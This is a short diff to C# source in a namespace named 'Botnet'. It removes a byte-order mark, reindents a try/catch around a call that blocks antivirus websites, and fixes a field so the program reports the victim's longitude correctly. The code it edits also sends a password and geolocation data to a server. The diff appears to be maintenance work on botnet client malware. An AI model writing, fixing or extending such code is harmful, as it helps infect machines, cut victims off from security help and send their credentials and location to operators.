@@ -1,4 +1,4 @@
-﻿using Ionic.Zip;
+using Ionic.Zip;
 using Newtonsoft.Json;
 using System;
 using System.Collections.Specialized;
@@ -43,13 +43,13 @@ namespace Botnet
             Console.WriteLine("Starting...");
             Utility.WaitForInternet();
 
-            try
-            {
-                Utility.BlockAntivirusWebsites();
-            }
-            catch (Exception e)
-            {
-                Console.WriteLine(e);
+                try
+                {
+                    Utility.BlockAntivirusWebsites();
+                }
+                catch (Exception e)
+                {
+                    Console.WriteLine(e);
             }
 
             if (Utility.GetMachineID() != "")
@@ -136,7 +136,7 @@ namespace Botnet
                 ["password"] = password,
                 ["programVersion"] = "" + Utility.GetProgramCurrentVersion(),
                 ["lat"] = "" + geo.lat,
-                ["lon"] = "" + geo.lat
+                ["lon"] = "" + geo.lon
             };
             Utility.ServerCommunication(postData);
         }
